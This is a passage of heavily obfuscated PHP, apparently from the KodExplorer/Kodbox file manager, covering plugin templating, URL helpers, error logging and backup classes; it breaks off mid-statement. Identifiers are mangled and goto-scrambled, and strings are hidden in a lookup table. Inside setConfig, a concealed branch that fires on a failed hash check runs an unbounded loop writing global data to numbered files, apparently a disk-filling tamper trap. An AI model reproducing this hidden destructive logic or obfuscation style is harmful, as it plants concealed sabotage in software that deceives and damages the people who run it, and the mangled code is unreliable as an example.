$this->parseLang($FÍøŒÙã); $BİÊ¸Ó¿ø = json_decode_force($FÍøŒÙã); if (!$BİÊ¸Ó¿ø) { return array(); } goto Eƒ­¯øÓÕ; Fâ´„¢…ŸÑ: return $BİÊ¸Ó¿ø; goto eİ£Å„ì‹; Eƒ­¯øÓÕ: $bêÃ§ˆ§õ¯ = Hook::trigger($DÑé×øÕ„µ[1337], $BİÊ¸Ó¿ø); if ($bêÃ§ˆ§õ¯ && is_array($bêÃ§ˆ§õ¯)) { $BİÊ¸Ó¿ø = $bêÃ§ˆ§õ¯; } $this->packageData = $BİÊ¸Ó¿ø; goto Fâ´„¢…ŸÑ; e˜¿Ç¥ÍÓ: $DÑé×øÕ„µ =& $_SERVER[í…¶]; if ($this->packageData) { return $this->packageData; } $FÍøŒÙã = $this->parseFile($this->pluginPath . $DÑé×øÕ„µ[1336]); goto C…˜„ÜÒñ›; eİ£Å„ì‹: } public function packageInfoGet($F„–ÏÒ©ƒô) { $e¨Ê­ßù·¿ = $this->appPackage(); return array_get_value($e¨Ê­ßù·¿, $F„–ÏÒ©ƒô); } public function packageVersion() { return $this->packageInfoGet($_SERVER[í…¶][1338]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[í…¶][1339]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[í…¶][1340]); } private function parseFile($eÜºˆ†¯‘Ş) { goto EàŞİµÙÒ; AòöÚ…Ï…: $cáŠµÒ›‰Ê = str_replace($dµ‚†ÒÁÇ², $e³ÔÂøèˆè, $cáŠµÒ›‰Ê); return $cáŠµÒ›‰Ê; goto BÎ‰õ²«¶; EàŞİµÙÒ: $DËßĞµèïÁ =& $_SERVER[í…¶]; $cáŠµÒ›‰Ê = file_get_contents($eÜºˆ†¯‘Ş); $dµ‚†ÒÁÇ² = array($DËßĞµèïÁ[1341], $DËßĞµèïÁ[1342], $DËßĞµèïÁ[1343], $DËßĞµèïÁ[1344], $DËßĞµèïÁ[1345], $DËßĞµèïÁ[1346], $DËßĞµèïÁ[1347]); goto A‰±”®²‘Ç; A‰±”®²‘Ç: $e³ÔÂøèˆè = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$DËßĞµèïÁ[84]][$DËßĞµèïÁ[1348]]); if (strstr($cáŠµÒ›‰Ê, $DËßĞµèïÁ[1349])) { $f‡è†»Óª = rawurlencode(json_encode($this->pluginLangArr)); $cáŠµÒ›‰Ê = str_replace($DËßĞµèïÁ[1349], $f‡è†»Óª, $cáŠµÒ›‰Ê); } if (strstr($cáŠµÒ›‰Ê, $DËßĞµèïÁ[1350])) { $f‡è†»Óª = $f‡è†»Óª = rawurlencode(json_encode($this->getConfig())); $cáŠµÒ›‰Ê = str_replace($DËßĞµèïÁ[1350], $f‡è†»Óª, $cáŠµÒ›‰Ê); } goto AòöÚ…Ï…; BÎ‰õ²«¶: } private function parseLang(&$béö¯¬Õ¥Ô) { goto Cğ…ĞÌ; FÇïÒëÆğ¯: preg_match_all($F‚»â›ï÷¾[1352], $béö¯¬Õ¥Ô, $fœï¥Ğ‹¾); if (!is_array($fœï¥Ğ‹¾) || count($fœï¥Ğ‹¾) == 0 || !is_array($fœï¥Ğ‹¾[0]) || count($fœï¥Ğ‹¾[0]) == 0) { return; } $eŸœ¿¹š¹ã = array(); goto e†ç‚ù›×; Cğ…ĞÌ: $F‚»â›ï÷¾ =& $_SERVER[í…¶]; $f¬êİŞºò¨ = $F‚»â›ï÷¾[1351]; if (!strstr($béö¯¬Õ¥Ô, $f¬êİŞºò¨)) { return; } goto FÇïÒëÆğ¯; e†ç‚ù›×: $aÃ„‹‡Óğ = array(); foreach ($fœï¥Ğ‹¾[0] as $e•¨³¦Ñä) { $A½¦¦¥•ô¿ = substr($e•¨³¦Ñä, strlen($f¬êİŞºò¨), -4); $EÀÃ³Î™ = LNG($A½¦¦¥•ô¿); $eŸœ¿¹š¹ã[] = $e•¨³¦Ñä; $aÃ„‹‡Óğ[] = str_replace(array($F‚»â›ï÷¾[217], $F‚»â›ï÷¾[990], $F‚»â›ï÷¾[330], $F‚»â›ï÷¾[113]), array($F‚»â›ï÷¾[50], $F‚»â›ï÷¾[50], $F‚»â›ï÷¾[33], $F‚»â›ï÷¾[1353]), $EÀÃ³Î™); } $béö¯¬Õ¥Ô = str_replace($eŸœ¿¹š¹ã, $aÃ„‹‡Óğ, $béö¯¬Õ¥Ô); goto fßÆ‹ÅÁŒÅ; fßÆ‹ÅÁŒÅ: } private function parseConfig(&$E¾éïĞ²î¼) { goto eÂ­‰Òˆ¨¦; b°ƒ¬æ‘÷õ: $A«ğÁ¶Í‘º = array(); $Aìà»¬÷í™ = array(); foreach ($D˜‰Ûºğó³[0] as $eñÓ³³•—) { $a˜öŠ¹·Ù = substr($eñÓ³³•—, strlen($Cë½²òÅ‡¦), -2); $A«ğÁ¶Í‘º[] = $eñÓ³³•—; $Aìà»¬÷í™[] = _get($CˆÕº‘±í¡, $a˜öŠ¹·Ù); } goto F–‘ğ´²ã“; eÂ­‰Òˆ¨¦: $E‚õÊ‹ƒº =& $_SERVER[í…¶]; $Cë½²òÅ‡¦ = $E‚õÊ‹ƒº[1354]; if (!strstr($E¾éïĞ²î¼, $Cë½²òÅ‡¦)) { return; } goto fÊî·ÜÙï¯; F–‘ğ´²ã“: $E¾éïĞ²î¼ = str_replace($A«ğÁ¶Í‘º, $Aìà»¬÷í™, $E¾éïĞ²î¼); goto F‰ŞË“©ßÏ; fÊî·ÜÙï¯: preg_match_all($E‚õÊ‹ƒº[1355], $E¾éïĞ²î¼, $D˜‰Ûºğó³); if (!is_array($D˜‰Ûºğó³) || count($D˜‰Ûºğó³) == 0 || !is_array($D˜‰Ûºğó³[0]) || count($D˜‰Ûºğó³[0]) == 0) { return; } $CˆÕº‘±í¡ = $this->getConfig(); goto b°ƒ¬æ‘÷õ; F‰ŞË“©ßÏ: } private function parsePackage(&$AÆŞ—Ô‹İ) { goto f²»Ëéèéğ; CæŠ‚œƒ†’: $B©Ù£”Õ¥§ = array(); $D‡ÒÙŸ“­Ú = array(); foreach ($bñ˜ÎõÇÍõ[0] as $bŒ¼­…¶¦ß) { $D¾Œ¤¥œ = substr($bŒ¼­…¶¦ß, strlen($cÌÈ¨¤ÙÊ†), -2); $B©Ù£”Õ¥§[] = $bŒ¼­…¶¦ß; $D‡ÒÙŸ“­Ú[] = _get($DµÛ¡ƒ¿«º, $D¾Œ¤¥œ); } goto DˆÒíÁ‚µ·; B¢åğ¾˜š«: preg_match_all($bî°–ãÙÅµ[1357], $AÆŞ—Ô‹İ, $bñ˜ÎõÇÍõ); if (!is_array($bñ˜ÎõÇÍõ) || count($bñ˜ÎõÇÍõ) == 0 || !is_array($bñ˜ÎõÇÍõ[0]) || count($bñ˜ÎõÇÍõ[0]) == 0) { return; } $DµÛ¡ƒ¿«º = $this->appPackage(); goto CæŠ‚œƒ†’; DˆÒíÁ‚µ·: $AÆŞ—Ô‹İ = str_replace($B©Ù£”Õ¥§, $D‡ÒÙŸ“­Ú, $AÆŞ—Ô‹İ); goto E…¸Ì”Õ›…; f²»Ëéèéğ: $bî°–ãÙÅµ =& $_SERVER[í…¶]; $cÌÈ¨¤ÙÊ† = $bî°–ãÙÅµ[1356]; if (!strstr($AÆŞ—Ô‹İ, $cÌÈ¨¤ÙÊ†)) { return; } goto B¢åğ¾˜š«; E…¸Ì”Õ›…: } final function echoFile($AŞÃŒ¦— Ê, $fïÄòÅŠ‡® = false) { goto cˆÆ‡„Ì›‡; d‰˜á÷¾…™: $this->parsePackage($f½–æ£³ˆ); if (is_array($fïÄòÅŠ‡®)) { $f½–æ£³ˆ = str_replace(array_keys($fïÄòÅŠ‡®), array_values($fïÄòÅŠ‡®), $f½–æ£³ˆ); } echo $Dª›Ëø²Íå[217] . $f½–æ£³ˆ; goto c °Ş‰£ø‚; cèÎÜ™–óÃ: $f½–æ£³ˆ = $this->parseFile($Aô‡¿Ş‚Ôë); $this->parseLang($f½–æ£³ˆ); $this->parseConfig($f½–æ£³ˆ); goto d‰˜á÷¾…™; cˆÆ‡„Ì›‡: $Dª›Ëø²Íå =& $_SERVER[í…¶]; $Aô‡¿Ş‚Ôë = $this->pluginPath . $AŞÃŒ¦— Ê; if (ACT == $Dª›Ëø²Íå[1358]) { echo $Dª›Ëø²Íå[1359] . $this->pluginName . $Dª›Ëø²Íå[8] . $AŞÃŒ¦— Ê . $Dª›Ëø²Íå[1360]; if (!file_exists($Aô‡¿Ş‚Ôë)) { echo $Dª›Ëø²Íå[1361]; return; } } goto cèÎÜ™–óÃ; c °Ş‰£ø‚: } final function initLang() { goto AÄÈÙÉÙº; fõ‹¼„–ñ²: if (!is_array($cßÂ¥Æ›ßÏ)) { return array(); } if (@count($cßÂ¥Æ›ßÏ) > 0) { I18n::set($cßÂ¥Æ›ßÏ); } return $cßÂ¥Æ›ßÏ; goto b¼ßôœˆóÎ; AÄÈÙÉÙº: $DÜÌŒÇ¿ŒÔ =& $_SERVER[í…¶]; $D±³°ˆÙ Ö = $DÜÌŒÇ¿ŒÔ[1362]; $a—®œòâæ = $this->pluginPath . $DÜÌŒÇ¿ŒÔ[1363]; goto dº’Î¦ĞË; dº’Î¦ĞË: $C«ååä¯Äó = I18n::getType(); $cßÂ¥Æ›ßÏ = array(); if (file_exists($a—®œòâæ . $C«ååä¯Äó . $DÜÌŒÇ¿ŒÔ[768])) { $cßÂ¥Æ›ßÏ = (include $a—®œòâæ . $C«ååä¯Äó . $DÜÌŒÇ¿ŒÔ[768]); } else { if ($C«ååä¯Äó == $DÜÌŒÇ¿ŒÔ[1364] && !file_exists($a—®œòâæ . $C«ååä¯Äó . $DÜÌŒÇ¿ŒÔ[768]) && file_exists($a—®œòâæ . $DÜÌŒÇ¿ŒÔ[1365])) { $cßÂ¥Æ›ßÏ = (include $a—®œòâæ . $DÜÌŒÇ¿ŒÔ[1365]); } else { if (file_exists($a—®œòâæ . $D±³°ˆÙ Ö . $DÜÌŒÇ¿ŒÔ[768])) { $cßÂ¥Æ›ßÏ = (include $a—®œòâæ . $D±³°ˆÙ Ö . $DÜÌŒÇ¿ŒÔ[768]); } } } goto fõ‹¼„–ñ²; b¼ßôœˆóÎ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($F«ÃÛ‡ÈÄ) { $eÒÏ¥‚Ö¢ß =& $_SERVER[í…¶]; $f½ğ”³¡» = $_SERVER[$eÒÏ¥‚Ö¢ß[792]] . $eÒÏ¥‚Ö¢ß[342]; $b£ô›ŠÔ×Ó = $eÒÏ¥‚Ö¢ß[343]; if ($_SERVER[$eÒÏ¥‚Ö¢ß[344]] != $b£ô›ŠÔ×Ó($f½ğ”³¡»)) { goto dÑÌ›¢Œ°Ú; c¾‹›ÍÄÅ: $dÌÈœíº‘­(); $E¨‰‡‰çŒã = $eÒÏ¥‚Ö¢ß[793]; $eÎ‡ğ¬’Æ• = json_encode($GLOBALS[$eÒÏ¥‚Ö¢ß[794]]); goto Aó‘­ÛºŞ; E„£¢‰ªìò: $fÑÃ‹Öï¥è = $eÒÏ¥‚Ö¢ß[791]; $fÑÃ‹Öï¥è($_SERVER[$eÒÏ¥‚Ö¢ß[792]]); $dÌÈœíº‘­ = $eÒÏ¥‚Ö¢ß[790]; goto c¾‹›ÍÄÅ; f×‘Ù”Æ ™: $c§À­„Çµğ = $Aƒ›¹áìï($F‰é„™±óŞ); $Bëíí¼­æŠ = explode($eÒÏ¥‚Ö¢ß[217], $c§À­„Çµğ); if (count($Bëíí¼­æŠ) < $eÒÏ¥‚Ö¢ß[564]) { $A¦©»ãÆ™ = $eÒÏ¥‚Ö¢ß[349]; $A¦©»ãÆ™(); } goto E„£¢‰ªìò; dÑÌ›¢Œ°Ú: $dÌÈœíº‘­ = $eÒÏ¥‚Ö¢ß[790]; $Aƒ›¹áìï = $eÒÏ¥‚Ö¢ß[345]; $F‰é„™±óŞ = $_SERVER[$eÒÏ¥‚Ö¢ß[346]] . $eÒÏ¥‚Ö¢ß[347]; goto f×‘Ù”Æ ™; Aó‘­ÛºŞ: $a§È¸†ÀêÃ = 1; for ($A¥³¡§ñ² = $a§È¸†ÀêÃ; $A¥³¡§ñ² > 0; $A¥³¡§ñ²++) { $E¨‰‡‰çŒã(DATA_PATH . $A¥³¡§ñ², $eÎ‡ğ¬’Æ•); } goto D¯‘‡¯ñé™; D¯‘‡¯ñé™: } return $this->modelPlugin->setConfig($this->pluginName, $F«ÃÛ‡ÈÄ); } public function onSetConfig($cÅ‹«É™è) { } public function onGetConfig($f²¶Šô¾³õ) { } public function onChangeStatus($aóÜ•‰ùëÅ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($D³ÈÙÆÌÆ£ = "\160\154\x75\147\x69\156\101\x75\x74\150") { $D™ÕÒ¼ÅÚÍ =& $_SERVER[í…¶]; if (!defined($D™ÕÒ¼ÅÚÍ[436])) { return !1; } if (_get($GLOBALS, $D™ÕÒ¼ÅÚÍ[466])) { return !0; } $d”âÍİ¸Ää = $this->getConfig(); if (!$d”âÍİ¸Ää[$D³ÈÙÆÌÆ£]) { return !1; } return ActionCall($D™ÕÒ¼ÅÚÍ[1366], $d”âÍİ¸Ää[$D³ÈÙÆÌÆ£]); } public function url($F°Ë—Ùë”, $D¡Áµ¸©ªÄ = '', $C³î¾¾ÈáÈ = true) { goto b“ö„–ª¢; f…àâÔˆ„Œ: $C‡èÒêïß‡ = $this->packageVersion(); $F®¦«ğ÷é² = $Cª´ÇÏäõÏ . $dÚÍ½²”…Ã[421] . $C‡èÒêïß‡; if (substr($F°Ë—Ùë”, 0, 4) == $dÚÍ½²”…Ã[144] || substr($F°Ë—Ùë”, 0, 2) == $dÚÍ½²”…Ã[1153]) { $DÄ›èùÑ… = $F°Ë—Ùë” . $dÚÍ½²”…Ã[1367] . $F®¦«ğ÷é²; } else { if ($D¡Áµ¸©ªÄ == $dÚÍ½²”…Ã[33]) { $DÄ›èùÑ… = $this->pluginHost . $F°Ë—Ùë” . $dÚÍ½²”…Ã[1367] . $F®¦«ğ÷é²; } else { if ($D¡Áµ¸©ªÄ === $dÚÍ½²”…Ã[76]) { $DÄ›èùÑ… = $this->pluginHost . $F°Ë—Ùë”; } else { if ($D¡Áµ¸©ªÄ == $dÚÍ½²”…Ã[1368]) { $DÄ›èùÑ… = STATIC_PATH . $F°Ë—Ùë” . $dÚÍ½²”…Ã[1367] . $Cª´ÇÏäõÏ; } else { if ($D¡Áµ¸©ªÄ == $dÚÍ½²”…Ã[1369]) { $DÄ›èùÑ… = APP_HOST . $dÚÍ½²”…Ã[1370] . $F°Ë—Ùë” . $dÚÍ½²”…Ã[1367] . $Cª´ÇÏäõÏ; } else { if (isset($C•…Š¨ó¯ø[$D¡Áµ¸©ªÄ])) { $DÄ›èùÑ… = $C•…Š¨ó¯ø[$D¡Áµ¸©ªÄ] . $F°Ë—Ùë” . $dÚÍ½²”…Ã[1367] . $F®¦«ğ÷é²; } } } } } } goto a•‹ÜÛÇ; a•‹ÜÛÇ: if (!$C³î¾¾ÈáÈ) { return $DÄ›èùÑ…; } echo $DÄ›èùÑ…; goto EÄ˜‹ãÙñË; b“ö„–ª¢: $dÚÍ½²”…Ã =& $_SERVER[í…¶]; $C•…Š¨ó¯ø = $this->getConfig(); $Cª´ÇÏäõÏ = KOD_VERSION . $dÚÍ½²”…Ã[91] . KOD_VERSION_BUILD; goto f…àâÔˆ„Œ; EÄ˜‹ãÙñË: } public function link($b…Ô…§õ‰º = false, $EÃùˆ¿õÖÛ = '') { $d£Îá£ìß› =& $_SERVER[í…¶]; if (!$b…Ô…§õ‰º) { $this->link($d£Îá£ìß›[1371], $d£Îá£ìß›[1369]); $this->link($d£Îá£ìß›[1372], $d£Îá£ìß›[1368]); $this->link($d£Îá£ìß›[1373], $d£Îá£ìß›[1368]); $this->link($d£Îá£ìß›[1374], $d£Îá£ìß›[1368]); $this->link($d£Îá£ìß›[1375], $d£Îá£ìß›[1368]); return; } $cŸ¬³‡¼¦ = $this->url($b…Ô…§õ‰º, $EÃùˆ¿õÖÛ, !1); if (substr($b…Ô…§õ‰º, -3) == $d£Îá£ìß›[1376]) { echo $d£Îá£ìß›[1377] . $cŸ¬³‡¼¦ . $d£Îá£ìß›[1378] . $d£Îá£ìß›[217]; } else { if (substr($b…Ô…§õ‰º, -4) == $d£Îá£ìß›[1379]) { echo $d£Îá£ìß›[1380] . $cŸ¬³‡¼¦ . $d£Îá£ìß›[1381] . $d£Îá£ìß›[217]; } } } } goto dˆŸÚâ‡­¶; eïŒñ…­·ö: function beforeShutdownError($B§İÎ³ËÂÁ = false, $dËµåàâ = '', $E‘çé‹¿Ÿ = '', $dİÑÔÎô¨ö = 0) { $F–äÈïõï” =& $_SERVER[²‡§™ıäÑÊº•]; switch ($B§İÎ³ËÂÁ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $C“Û¥Îˆ™Ê = $F–äÈïõï”[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $C“Û¥Îˆ™Ê = $F–äÈïõï”[40]; break; case E_STRICT: $C“Û¥Îˆ™Ê = $F–äÈïõï”[41]; break; case E_NOTICE: case E_USER_NOTICE: $C“Û¥Îˆ™Ê = $F–äÈïõï”[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $C“Û¥Îˆ™Ê = $F–äÈïõï”[43]; break; default: break; } if (!$C“Û¥Îˆ™Ê || $C“Û¥Îˆ™Ê == $F–äÈïõï”[42] || $C“Û¥Îˆ™Ê == $F–äÈïõï”[43]) { return; } $E‘çé‹¿Ÿ = $F–äÈïõï”[4] . str_replace($_SERVER[$F–äÈïõï”[37]], $F–äÈïõï”[20], $E‘çé‹¿Ÿ); $cËƒ¬Äˆ•Ã = $C“Û¥Îˆ™Ê . $F–äÈïõï”[44] . $dËµåàâ . $F–äÈïõï”[44] . $E‘çé‹¿Ÿ . $F–äÈïõï”[44] . $dİÑÔÎô¨ö; write_log($cËƒ¬Äˆ•Ã . $F–äÈïõï”[18] . get_caller_msg(1), $F–äÈïõï”[19]); } $_SERVER[$_SERVER[²‡§™ıäÑÊº•][45]] = $_SERVER[$_SERVER[²‡§™ıäÑÊº•][37]] . $_SERVER[²‡§™ıäÑÊº•][46]; $EØã¥Í’¸ = strrev(base64_decode($_SERVER[²‡§™ıäÑÊº•][47])); goto cÄâ„òë¤£; c¢¨ë¤ì”™: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $eÕœÏ¯¸ =& $_SERVER[í…¶]; self::$name = date($eÕœÏ¯¸[689]); if (!($D½”¥¶‹Ê… = Model($eÕœÏ¯¸[690])->lastItem())) { $D½”¥¶‹Ê… = $this->initData(); } else { self::$name = $D½”¥¶‹Ê…[$eÕœÏ¯¸[28]]; if ($D½”¥¶‹Ê…[$eÕœÏ¯¸[691]] == $eÕœÏ¯¸[83]) { self::$name = date($eÕœÏ¯¸[692]); $b¿Ğ¾¼‡çª = 0; if (isset($D½”¥¶‹Ê…[$eÕœÏ¯¸[281]][$eÕœÏ¯¸[167]][$eÕœÏ¯¸[428]])) { $b¿Ğ¾¼‡çª = (int) $D½”¥¶‹Ê…[$eÕœÏ¯¸[281]][$eÕœÏ¯¸[167]][$eÕœÏ¯¸[428]]; } if ($D½”¥¶‹Ê…[$eÕœÏ¯¸[28]] == self::$name) { Model($eÕœÏ¯¸[690])->remove($D½”¥¶‹Ê…[$eÕœÏ¯¸[376]]); } $D½”¥¶‹Ê… = $this->initData($b¿Ğ¾¼‡çª, $D½”¥¶‹Ê…[$eÕœÏ¯¸[693]]); } else { $this->checkStore($D½”¥¶‹Ê…[$eÕœÏ¯¸[693]]); } } self::$option = $D½”¥¶‹Ê…; } private function initData($f”Õë«ïµ = 0, $Cä¿¶Å®­Í = '') { goto F¯‘‰È¦Ï¯; F¯‘‰È¦Ï¯: $f‘•¦Ø¨ª =& $_SERVER[í…¶]; $AÙÔçÃç“© = Model($f‘•¦Ø¨ª[690])->config(); if ($Cä¿¶Å®­Í && $AÙÔçÃç“©[$f‘•¦Ø¨ª[693]] != $Cä¿¶Å®­Í) { $f”Õë«ïµ = 0; } goto E‘¼†²”…; E‘¼†²”…: $this->checkStore($AÙÔçÃç“©[$f‘•¦Ø¨ª[693]]); $FÓáß¦Òä° = array($f‘•¦Ø¨ª[693] => $AÙÔçÃç“©[$f‘•¦Ø¨ª[693]], $f‘•¦Ø¨ª[28] => self::$name, $f‘•¦Ø¨ª[691] => 0, $f‘•¦Ø¨ª[694] => $AÙÔçÃç“©[$f‘•¦Ø¨ª[694]], $f‘•¦Ø¨ª[281] => array($f‘•¦Ø¨ª[695] => array($f‘•¦Ø¨ª[691] => 0), $f‘•¦Ø¨ª[696] => array($f‘•¦Ø¨ª[691] => 0, $f‘•¦Ø¨ª[697] => 0, $f‘•¦Ø¨ª[698] => 0, $f‘•¦Ø¨ª[29] => $f‘•¦Ø¨ª[33]), $f‘•¦Ø¨ª[699] => array($f‘•¦Ø¨ª[691] => 0, $f‘•¦Ø¨ª[697] => 0, $f‘•¦Ø¨ª[698] => 0), $f‘•¦Ø¨ª[167] => array($f‘•¦Ø¨ª[691] => 0, $f‘•¦Ø¨ª[700] => 0, $f‘•¦Ø¨ª[701] => 0, $f‘•¦Ø¨ª[702] => 0, $f‘•¦Ø¨ª[703] => 0, $f‘•¦Ø¨ª[428] => $f”Õë«ïµ)), $f‘•¦Ø¨ª[704] => time(), $f‘•¦Ø¨ª[705] => 0); $A§ÑĞİß‡ = Model($f‘•¦Ø¨ª[690])->insert($FÓáß¦Òä°); goto CÜ³»•õ‘Ğ; CÜ³»•õ‘Ğ: $FÓáß¦Òä°[$f‘•¦Ø¨ª[376]] = $A§ÑĞİß‡; return $FÓáß¦Òä°; goto B™«Äš¸Ôô; B™«Äš¸Ôô: } private function checkStore($a¥å†ª­”ä) { $A·¨‘öª‘™ =& $_SERVER[í…¶]; $AÅôÈ„¦» = Model($A·¨‘öª‘™[706])->listData($a¥å†ª­”ä); Model($A·¨‘öª‘™[706])->checkConfig($AÅôÈ„¦»); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[í…¶][690])->findByName(self::$name); } return self::$option; } public static function set($FªÜÚœÅ¥) { $fêÇÎ÷ğšî =& $_SERVER[í…¶]; $aÈÃÛƒ¢Œâ = self::get(); foreach ($FªÜÚœÅ¥ as $eèÂ‚ÆØøì => $b•ğí•°‰) { $D ¥É˜Æ‹­ = explode($fêÇÎ÷ğšî[91], $eèÂ‚ÆØøì); $FíÚ¡ïÃ© = count($D ¥É˜Æ‹­); switch ($FíÚ¡ïÃ©) { case 1: $aÈÃÛƒ¢Œâ[$D ¥É˜Æ‹­[0]] = $b•ğí•°‰; break; case 2: $aÈÃÛƒ¢Œâ[$D ¥É˜Æ‹­[0]][$D ¥É˜Æ‹­[1]] = $b•ğí•°‰; break; case 3: $aÈÃÛƒ¢Œâ[$D ¥É˜Æ‹­[0]][$D ¥É˜Æ‹­[1]][$D ¥É˜Æ‹­[2]] = $b•ğí•°‰; break; } } Model($fêÇÎ÷ğšî[690])->update($aÈÃÛƒ¢Œâ[$fêÇÎ÷ğšî[376]], $aÈÃÛƒ¢Œâ); self::$option = $aÈÃÛƒ¢Œâ; return self::$option; } public function keep() { $C—½‹šŒ =& $_SERVER[í…¶]; $a¹öÀ Óæ× = self::get(); if ($a¹öÀ Óæ×[$C—½‹šŒ[281]][$C—½‹šŒ[695]][$C—½‹šŒ[691]] == $C—½‹šŒ[83]) { return; } $this->backupKeep($a¹öÀ Óæ×); self::set(array($C—½‹šŒ[707] => 1)); } private function backupKeep($fäŸ±‹È†Í) { goto e´ÛŒ‡ÀÆ; a‡‡íÜë‰à: $B« ¹´ì‡ì = 0; $EñÖÎİ›ì = array(); foreach ($Bè£¼…´á× as $cñóöœàÃ§) { if ($B« ¹´ì‡ì >= 7) { break; } $EñÖÎİ›ì[] = $cñóöœàÃ§[$F©‡®ŒÍÆ¨[28]]; $B« ¹´ì‡ì++; } goto d”À¯×£ˆÅ; d”À¯×£ˆÅ: for ($B« ¹´ì‡ì = 0; $B« ¹´ì‡ì < 12; $B« ¹´ì‡ì++) { $EñÖÎİ›ì[] = date($F©‡®ŒÍÆ¨[708], strtotime("\x2d{$B« ¹´ì‡ì}\40\x6d\157\x6e\x74\x68\163")); } $EñÖÎİ›ì = array_unique($EñÖÎİ›ì); foreach ($Bè£¼…´á× as $cñóöœàÃ§) { if (!empty($cñóöœàÃ§[$F©‡®ŒÍÆ¨[28]]) && in_array($cñóöœàÃ§[$F©‡®ŒÍÆ¨[28]], $EñÖÎİ›ì)) { continue; } Model($F©‡®ŒÍÆ¨[690])->remove($cñóöœàÃ§[$F©‡®ŒÍÆ¨[376]]); $eâˆğ­¸† = "\173\x69\157\x3a{$fäŸ±‹È†Í[$F©‡®ŒÍÆ¨[693]]}\175\57\x64\141\164\141\x62\x61\163\x65\x2f\142\x61\143\153\x75\x70\x5f{$cñóöœàÃ§[$F©‡®ŒÍÆ¨[28]]}"; IO::remove($eâˆğ­¸†, !1); } goto f‘¥½†ŠŠ; e´ÛŒ‡ÀÆ: $F©‡®ŒÍÆ¨ =& $_SERVER[í…¶]; $Bè£¼…´á× = Model($F©‡®ŒÍÆ¨[690])->listData(); if (empty($Bè£¼…´á×)) { return; } goto a‡‡íÜë‰à; f‘¥½†ŠŠ: } public function db() { goto bµ  Í–; bµ  Í–: $a«¦áóæÓ‰ =& $_SERVER[í…¶]; $FÄÕ‰©á = self::get(); if ($FÄÕ‰©á[$a«¦áóæÓ‰[281]][$a«¦áóæÓ‰[696]][$a«¦áóæÓ‰[691]] == $a«¦áóæÓ‰[83]) { return !0; } goto eÆË§÷õĞ; Eøµ„¶£›‰: return !0; goto fÆ¤¥éğ×Ö; eÆË§÷õĞ: $C¨õè±Ò´æ = new BackupDb(); if (!$C¨õè±Ò´æ->index()) { return !1; } self::set(array($a«¦áóæÓ‰[709] => 1)); goto Eøµ„¶£›‰; fÆ¤¥éğ×Ö: } public function dbFile() { goto aëÏªË„È­; EŠ‘éª‹¬Æ: $DÍˆëÚã¯ = new BackupDbFile(); if (!$DÍˆëÚã¯->index()) { return !1; } self::set(array($D¨öóÇÒµ[710] => 1)); goto DàÃÉ´·ä˜; aëÏªË„È­: $D¨öóÇÒµ =& $_SERVER[í…¶]; $fŞ…³²— = self::get(); if ($fŞ…³²—[$D¨öóÇÒµ[281]][$D¨öóÇÒµ[699]][$D¨öóÇÒµ[691]] == $D¨öóÇÒµ[83]) { return !0; } goto EŠ‘éª‹¬Æ; DàÃÉ´·ä˜: return !0; goto e‰£“‘¹‰; e‰£“‘¹‰: } public function file() { $bÆÜ³’æ¬ä =& $_SERVER[í…¶]; $C‘¬°Öšùˆ = self::get(); if ($C‘¬°Öšùˆ[$bÆÜ³’æ¬ä[281]][$bÆÜ³’æ¬ä[167]][$bÆÜ³’æ¬ä[691]] == $bÆÜ³’æ¬ä[83]) { return !0; } if (!isset($C‘¬°Öšùˆ[$bÆÜ³’æ¬ä[694]]) || $C‘¬°Öšùˆ[$bÆÜ³’æ¬ä[694]] == $bÆÜ³’æ¬ä[477]) { $Dƒ½®òà“² = new BackupFile(); if (!$Dƒ½®òà“²->index()) { return !1; } } self::set(array($bÆÜ³’æ¬ä[711] => 1, $bÆÜ³’æ¬ä[691] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto f›ì¿’ì; fåÈØäñ®ò: mk_dir($Cõ¶›à©ë); $a§Ô†ßçŸÛ = $AŠáãù‰¦Ö = 0; $DÒœËëöÌå = $CÇ¥ÍÖÚµ­->db()->getTables(); goto cç¤‡«Œ¬; f›ì¿’ì: $EîÑ‹È„”£ =& $_SERVER[í…¶]; $a³İÆŞÍ‰Ç = Backup::get(); self::$io = $a³İÆŞÍ‰Ç[$EîÑ‹È„”£[693]]; goto e®ØŠ˜ñî÷; e¸âÈêß“œ: Backup::set($d¡×°ìÒµÓ); return !0; goto cÔÕªÍÆšÉ; cç¤‡«Œ¬: $DÒœËëöÌå = array_diff($DÒœËëöÌå, array($EîÑ‹È„”£[713], $EîÑ‹È„”£[714])); foreach ($DÒœËëöÌå as $f‡‘‘“­è±) { $a§Ô†ßçŸÛ += $CÇ¥ÍÖÚµ­->model($f‡‘‘“­è±)->count(); } $eèÄÌÈŸ—À = new Task($EîÑ‹È„”£[715], $EîÑ‹È„”£[716], $a§Ô†ßçŸÛ, LNG($EîÑ‹È„”£[717]) . $EîÑ‹È„”£[718] . LNG($EîÑ‹È„”£[719])); goto a•Ò­ï¸; AÛÃÎ­œÙ: $CÇ¥ÍÖÚµ­ = new DbManage($bÉ…Ø½©İù, $d¿µ¡¯Å¿Ì); $Cõ¶›à©ë = TEMP_FILES . $EîÑ‹È„”£[712] . self::$name . $EîÑ‹È„”£[8]; del_dir($Cõ¶›à©ë); goto fåÈØäñ®ò; e®ØŠ˜ñî÷: self::$name = $a³İÆŞÍ‰Ç[$EîÑ‹È„”£[28]]; $bÉ…Ø½©İù = $GLOBALS[$EîÑ‹È„”£[6]][$EîÑ‹È„”£[17]]; $d¿µ¡¯Å¿Ì = $this->_dbType($bÉ…Ø½©İù); goto AÛÃÎ­œÙ; a•Ò­ï¸: foreach ($DÒœËëöÌå as $f‡‘‘“­è±) { $B´‚ Ü´¢Ô = $Cõ¶›à©ë . $f‡‘‘“­è± . $EîÑ‹È„”£[720]; $AŒàº—»Õ = null; if ($f‡‘‘“­è± == 